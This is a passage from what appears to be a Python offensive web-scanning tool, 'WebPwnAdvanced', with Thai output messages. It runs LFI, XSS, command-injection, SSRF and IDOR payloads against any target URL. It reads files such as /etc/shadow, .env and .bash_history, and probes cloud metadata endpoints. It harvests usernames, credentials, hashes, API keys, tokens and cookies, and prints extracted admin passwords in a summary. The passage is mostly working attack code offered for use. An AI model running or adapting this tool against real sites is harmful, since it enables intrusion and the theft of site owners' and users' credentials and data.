            ('../../../windows/win.ini', 'windows_ini'),
            ('..%2f..%2f..%2fwindows%2fwin.ini', 'windows_ini'),
            ('C:\\\\windows\\\\win.ini', 'windows_ini'),
            ('C:/windows/win.ini', 'windows_ini'),
            ('/proc/self/environ', 'proc_environ'),
            ('../../../var/log/apache2/access.log', 'apache_log'),
            ('../../../var/log/httpd/access.log', 'httpd_log'),
            ('../../../var/log/nginx/access.log', 'nginx_log'),
            ('../../../var/www/html/.env', 'env_file'),
            ('../../../var/www/.env', 'env_file'),
            ('../../../home/user/.bash_history', 'bash_history'),
            ('../../../home/www-data/.bash_history', 'bash_history'),
            ('../../../root/.bash_history', 'root_history'),
            ('../../../etc/shadow', 'shadow_file'),
            ('../../../etc/mysql/my.cnf', 'mysql_config'),
            ('../../../etc/hosts', 'hosts_file'),
            ('../../../etc/hostname', 'hostname'),
            ('../../../etc/issue', 'os_info'),
            ('../../../etc/os-release', 'os_release'),
        ]

        test_urls = [u for u in self.crawled_urls if '?' in u][:20]

        for url in test_urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            for param in params:
                for payload, payload_type in lfi_payloads:
                    test_url = url.replace(f"{param}={params[param][0]}", f"{param}={payload}")
                    resp = self._request(test_url)
                    if resp:
                        if payload_type == 'linux_passwd' and 'root:x:' in resp.text:
                            self.results['lfi'].append({
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'type': 'LFI - /etc/passwd',
                                'evidence': resp.text[:500]
                            })
                            users = re.findall(r'([^:]+):x?\d*:\d*:', resp.text)
                            for user in users:
                                if user not in ['root', 'daemon', 'bin', 'sys', 'sync']:
                                    self.results['users_extracted'].append({
                                        'username': user,
                                        'source': f'LFI /etc/passwd - {url}'
                                    })

                        elif payload_type == 'php_source' and resp.text:
                            try:
                                decoded = base64.b64decode(resp.text)
                                self.results['lfi'].append({
                                    'url': test_url,
                                    'parameter': param,
                                    'payload': payload,
                                    'type': 'LFI - PHP Source Code',
                                    'evidence': decoded[:500]
                                })
                                self._extract_all_credentials(decoded.decode('utf-8', errors='ignore'), test_url)
                            except:
                                pass

                        elif payload_type == 'env_file' and 'DB_' in resp.text:
                            self.results['lfi'].append({
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'type': 'LFI - .env File',
                                'evidence': resp.text[:500]
                            })
                            self._parse_env_file(resp.text, test_url)

    def scan_xss(self):
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "\"><img src=x onerror=alert('XSS')>",
            "';alert('XSS');//",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<img src=\"javascript:alert('XSS')\">",
            "<a href=\"javascript:alert('XSS')\">click</a>",
        ]

        test_urls = [u for u in self.crawled_urls if '?' in u][:30]

        def test_xss(url):
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            for param in params:
                for payload in xss_payloads:
                    test_url = url.replace(f"{param}={params[param][0]}", f"{param}={payload}")
                    resp = self._request(test_url)
                    if resp and payload in resp.text:
                        self.results['xss'].append({
                            'url': test_url,
                            'parameter': param,
                            'payload': payload,
                            'type': 'Reflected XSS'
                        })
                        return

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(test_xss, test_urls)

    def scan_rce(self):
        rce_payloads = [
            (';id', 'linux_id'),
            (';whoami', 'linux_whoami'),
            (';cat /etc/passwd', 'linux_passwd'),
            ('|id', 'pipe_id'),
            ('`id`', 'backtick_id'),
            ('$(id)', 'dollar_id'),
            (';echo PWNED', 'echo_test'),
            (';phpinfo()', 'phpinfo'),
            (';system("id")', 'system_id'),
            (';eval($_GET[1])', 'eval_get'),
            ('../../../../../../../bin/cat /etc/passwd', 'traversal_cat'),
            ('....//....//....//....//....//bin/cat /etc/passwd', 'double_dot_cat'),
        ]

        test_urls = [u for u in self.crawled_urls if '?' in u][:15]

        for url in test_urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            for param in params:
                for payload, payload_type in rce_payloads:
                    test_url = url.replace(f"{param}={params[param][0]}", f"{param}={payload}")
                    resp = self._request(test_url)
                    if resp:
                        if payload_type in ['linux_id', 'pipe_id', 'backtick_id', 'dollar_id'] and 'uid=' in resp.text:
                            self.results['rce'].append({
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'type': 'RCE - Command Injection',
                                'evidence': resp.text[:300]
                            })
                        elif payload_type == 'echo_test' and 'PWNED' in resp.text:
                            self.results['rce'].append({
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'type': 'RCE - Echo Test',
                                'evidence': resp.text[:300]
                            })

    def scan_ssrf(self):
        ssrf_payloads = [
            'http://127.0.0.1',
            'http://localhost',
            'http://0.0.0.0',
            'http://[::1]',
            'file:///etc/passwd',
            'dict://127.0.0.1:6379',
            'gopher://127.0.0.1:3306',
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/metadata/v1/',
            'http://metadata.google.internal/',
        ]

        test_urls = [u for u in self.crawled_urls if '?' in u][:15]

        for url in test_urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            for param in params:
                for payload in ssrf_payloads:
                    test_url = url.replace(f"{param}={params[param][0]}", f"{param}={payload}")
                    resp = self._request(test_url)
                    if resp:
                        if 'root:x:' in resp.text or 'ami-id' in resp.text or 'instance-id' in resp.text:
                            self.results['ssrf'].append({
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'type': 'SSRF',
                                'evidence': resp.text[:300]
                            })

    def scan_idor(self):
        id_patterns = [
            ('id', ['1', '2', '3', '4', '5']),
            ('user_id', ['1', '2', '3']),
            ('account', ['1', '2', '3']),
            ('profile', ['1', '2', '3']),
            ('order', ['1', '2', '3']),
            ('file', ['1', '2', '3']),
        ]

        test_urls = [u for u in self.crawled_urls if '?' in u][:20]

        for url in test_urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            for param, values in id_patterns:
                if param in params:
                    original_value = params[param][0]
                    for test_val in values:
                        if test_val != original_value:
                            test_url = url.replace(f"{param}={original_value}", f"{param}={test_val}")
                            resp = self._request(test_url)
                            if resp and resp.status_code == 200:
                                if len(resp.text) > 100 and 'error' not in resp.text.lower():
                                    self.results['idor'].append({
                                        'url': test_url,
                                        'parameter': param,
                                        'original': original_value,
                                        'modified': test_val,
                                        'type': 'IDOR - Potential Data Exposure'
                                    })

    def crawl(self, max_depth=3, max_pages=200):
        to_crawl = [(self.target, 0)]
        crawled_count = 0

        while to_crawl and crawled_count < max_pages:
            current_url, depth = to_crawl.pop(0)

            if current_url in self.crawled_urls or depth > max_depth:
                continue

            self.crawled_urls.add(current_url)
            crawled_count += 1

            resp = self._request(current_url)
            if not resp or resp.status_code != 200:
                continue

            forms = self._extract_forms(resp.text, current_url)
            self.forms.extend(forms)

            links = self._extract_links(resp.text, current_url)
            for link in links:
                if link not in self.crawled_urls:
                    to_crawl.append((link, depth + 1))

            time.sleep(0.05)

    def extract_cookies_tokens(self):
        resp = self._request(self.target)
        if resp:
            for cookie in resp.cookies:
                self.results['cookies'].append({
                    'name': cookie.name,
                    'value': cookie.value,
                    'domain': cookie.domain,
                    'path': cookie.path
                })

            for header, value in resp.headers.items():
                if any(k in header.lower() for k in ['token', 'auth', 'x-api', 'authorization']):
                    self.results['tokens'].append({
                        'header': header,
                        'value': value[:100] if len(value) > 100 else value
                    })

            token_patterns = [
                r'["\']token["\']\s*:\s*["\']([^"\']+)["\']',
                r'["\']access_token["\']\s*:\s*["\']([^"\']+)["\']',
                r'["\']api_key["\']\s*:\s*["\']([^"\']+)["\']',
                r'csrf_token["\']?\s*[=:]\s*["\']([^"\']+)["\']',
            ]
            for pattern in token_patterns:
                matches = re.findall(pattern, resp.text)
                for match in matches:
                    self.results['tokens'].append({
                        'type': 'body_token',
                        'value': match
                    })

    def run_full_scan(self):
        print(f"[+] เริ่มสแกนเป้าหมาย: {self.target}")
        print(f"[*] เธรด: {self.threads} | Timeout: {self.timeout}s")

        print("[*] กำลังดึง Cookies และ Tokens...")
        self.extract_cookies_tokens()

        print("[*] กำลัง Crawl เว็บไซต์...")
        self.crawl()
        print(f"[+] พบ {len(self.crawled_urls)} URL และ {len(self.forms)} ฟอร์ม")

        print("[*] กำลังสแกนหาไฟล์ที่ละเอียดอ่อน...")
        self.scan_sensitive_files()

        print("[*] กำลังสแกนหาหน้า Admin และเจาะรหัสผ่าน...")
        self.scan_and_brute_admin()

        print("[*] กำลังสแกนหาไฟล์สำรองฐานข้อมูล...")
        self.scan_database_dumps()

        print("[*] กำลังสแกนหาช่องโหว่ SQL Injection ขั้นสูง...")
        self.scan_sqli_advanced()

        print("[*] กำลังสแกนหาช่องโหว่ XSS...")
        self.scan_xss()

        print("[*] กำลังสแกนหาช่องโหว่ LFI...")
        self.scan_lfi()

        print("[*] กำลังสแกนหาช่องโหว่ RCE...")
        self.scan_rce()

        print("[*] กำลังสแกนหาช่องโหว่ SSRF...")
        self.scan_ssrf()

        print("[*] กำลังสแกนหาช่องโหว่ IDOR...")
        self.scan_idor()

        return self.results

    def generate_report(self, output_file='scan_report.json'):
        report = {
            'target': self.target,
            'scan_time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'summary': {
                'urls_crawled': len(self.crawled_urls),
                'forms_found': len(self.forms),
                'sqli_vulnerabilities': len(self.results['sqli']),
                'xss_vulnerabilities': len(self.results['xss']),
                'lfi_vulnerabilities': len(self.results['lfi']),
                'rce_vulnerabilities': len(self.results['rce']),
                'ssrf_vulnerabilities': len(self.results['ssrf']),
                'idor_vulnerabilities': len(self.results['idor']),
                'admin_panels': len(self.results['admin_panels']),
                'backup_files': len(self.results['backup_files']),
                'sensitive_files': len(self.results['sensitive_files']),
                'credentials_found': len(self.results['credentials']),
                'users_extracted': len(self.results['users_extracted']),
                'admin_accounts': len(self.results['admin_accounts']),
                'hashes_found': len(self.results['hashes']),
                'api_keys_found': len(self.results['api_keys']),
                'tokens_found': len(self.results['tokens']),
                'cookies_found': len(self.results['cookies'])
            },
            'details': self.results,
            'crawled_urls': list(self.crawled_urls),
            'forms': self.forms
        }

        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)

        print(f"\n[+] รายงานถูกบันทึกที่: {output_file}")
        return report

    def print_summary(self):
        print("\n" + "="*70)
        print("สรุปผลการสแกน - ข้อมูลที่ดึงออกมาได้")
        print("="*70)

        if self.results['admin_accounts']:
            print(f"\n[!!!] พบบัญชี Admin: {len(self.results['admin_accounts'])} รายการ")
            for a in self.results['admin_accounts']:
                print(f"    Username: {a.get('username', 'N/A')}")
                print(f"    Password: {a.get('password', 'N/A')}")
                print(f"    แหล่งที่มา: {a.get('source', 'N/A')}")
                print(f"    {'-'*50}")

        if self.results['users_extracted']:
            print(f"\n[!!] พบข้อมูลผู้ใช้: {len(self.results['users_extracted'])} รายการ")
            for u in self.results['users_extracted'][:20]:
                print(f"    Username: {u.get('username', 'N/A')}")
                if u.get('password'):
                    print(f"    Password: {u.get('password')}")
                if u.get('email'):
                    print(f"    Email: {u.get('email')}")
                print(f"    แหล่งที่มา: {u.get('source', 'N/A')}")
                print(f"    {'-'*50}")

        if self.results['credentials']:
            print(f"\n[!!] พบ Credentials: {len(self.results['credentials'])} รายการ")
            for c in self.results['credentials'][:20]:
                print(f"    Type: {c.get('type', 'N/A')}")
                print(f"    Value: {c.get('credential', 'N/A')[:80]}")
                print(f"    แหล่งที่มา: {c.get('source', 'N/A')}")
                print(f"    {'-'*50}")

        if self.results['hashes']:
            print(f"\n[!!] พบ Password Hashes: {len(self.results['hashes'])} รายการ")
            for h in self.results['hashes']:
                print(f"    Hash: {h.get('hash', 'N/A')}")
                print(f"    Type: {h.get('type', 'N/A')}")
                print(f"    Username: {h.get('username', 'N/A')}")
                print(f"    {'-'*50}")

        if self.results['api_keys']:
            print(f"\n[!!] พบ API Keys: {len(self.results['api_keys'])} รายการ")
            for k in self.results['api_keys']:
                print(f"    Key: {k.get('key', 'N/A')[:60]}...")
                print(f"    Type: {k.get('type', 'N/A')}")
                print(f"    {'-'*50}")

        if self.results['tokens']:
            print(f"\n[!!] พบ Tokens: {len(self.results['tokens'])} รายการ")
            for t in self.results['tokens']:
                print(f"    {t}")

        if self.results['cookies']:
            print(f"\n[!!] พบ Cookies: {len(self.results['cookies'])} รายการ")
            for c in self.results['cookies']:
                print(f"    {c['name']}={c['value'][:50]}")

        if self.results['sqli']:
            print(f"\n[!!] พบช่องโหว่ SQL Injection: {len(self.results['sqli'])} รายการ")
            for s in self.results['sqli']:
                print(f"    URL: {s['url']}")
                print(f"    Type: {s['type']}")
                if 'extracted_data' in s:
                    print(f"    ข้อมูลที่ดึงได้: {json.dumps(s['extracted_data'], ensure_ascii=False)[:200]}")
                print(f"    {'-'*50}")

        if self.results['lfi']:
            print(f"\n[!!] พบช่องโหว่ LFI: {len(self.results['lfi'])} รายการ")
            for l in self.results['lfi']:
                print(f"    URL: {l['url']}")
                print(f"    Type: {l['type']}")
                print(f"    {'-'*50}")

        if self.results['rce']:
            print(f"\n[!!] พบช่องโหว่ RCE: {len(self.results['rce'])} รายการ")
            for r in self.results['rce']:
                print(f"    URL: {r['url']}")
                print(f"    Type: {r['type']}")
                print(f"    {'-'*50}")

        if self.results['admin_panels']:
            print(f"\n[!!] พบหน้า Admin: {len(self.results['admin_panels'])} รายการ")
            for a in self.results['admin_panels']:
                print(f"    {a['url']} [Status: {a['status']}] {a.get('title', '')}")

        if self.results['sensitive_files']:
            print(f"\n[!!] พบไฟล์ที่ละเอียดอ่อน: {len(self.results['sensitive_files'])} รายการ")
            for f in self.results['sensitive_files']:
                print(f"    {f['url']} ({f['size']} bytes)")

        if self.results['backup_files']:
            print(f"\n[!!] พบไฟล์สำรอง: {len(self.results['backup_files'])} รายการ")
            for b in self.results['backup_files']:
                print(f"    {b['url']} ({b['size']} bytes)")


# =============================================================================
# ฟังก์ชันหลัก
# =============================================================================
def main():
    parser = argparse.ArgumentParser(description='เครื่องมือสแกนความปลอดภัยเว็บไซต์ขั้นสูง')
    parser.add_argument('target', help='URL เป้าหมาย (เช่น https://example.com)')
    parser.add_argument('-t', '--threads', type=int, default=20, help='จำนวนเธรด (ค่าเริ่มต้น: 20)')
    parser.add_argument('-o', '--output', default='scan_report.json', help='ไฟล์รายงาน')
    parser.add_argument('--timeout', type=int, default=15, help='เวลาหมดเวลา (ค่าเริ่มต้น: 15 วินาที)')
    parser.add_argument('--proxy', help='Proxy (เช่น http://127.0.0.1:8080)')

    args = parser.parse_args()

    if not args.target.startswith(('http://', 'https://')):
        print("[-] กรุณาระบุ URL ที่ถูกต้อง (ต้องขึ้นต้นด้วย http:// หรือ https://)")
        sys.exit(1)

    scanner = WebPwnAdvanced(args.target, threads=args.threads, timeout=args.timeout, proxy=args.proxy)
    scanner.run_full_scan()
    scanner.generate_report(args.output)
    scanner.print_summary()


if __name__ == '__main__':
    main()
